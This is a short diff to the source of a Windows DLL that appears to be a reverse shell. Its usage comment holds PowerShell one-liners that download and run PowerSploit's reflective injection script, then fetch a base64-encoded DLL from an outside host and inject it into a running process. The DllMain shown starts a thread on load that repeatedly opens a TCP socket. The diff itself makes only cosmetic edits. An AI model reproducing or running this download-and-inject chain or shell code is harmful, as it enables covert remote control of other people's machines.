@@ -1,7 +1,7 @@
 /*
 * USAGE: 
 *
-* [System.Convert]::ToBase64String([IO.File]::ReadAllBytes("ReverseShell.dll")) > dll.txt
+* [System.Convert]::ToBase64String([IO.File]::ReadAllBytes("reflective_dll.dll")) > dll.txt
 *
 * iex ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"))
 * Invoke-ReflectivePEInjection -PEBytes ([System.Convert]::FromBase64String(((New-Object Net.WebClient).DownloadString("https://blah.org/dll.txt")))) -ProcId 1234
@@ -23,7 +23,7 @@ PROCESS_INFORMATION processo_info;
 
 DWORD WINAPI ThreadFunc(void* data)
 {
-	while (true) 
+	while (TRUE) 
 	{
 		WSAStartup(MAKEWORD(2, 2), &wsaData);
 		Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
@@ -52,5 +52,6 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
 {
 	if (dwReason == DLL_PROCESS_ATTACH)
 		CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
+
 	return TRUE;
 }
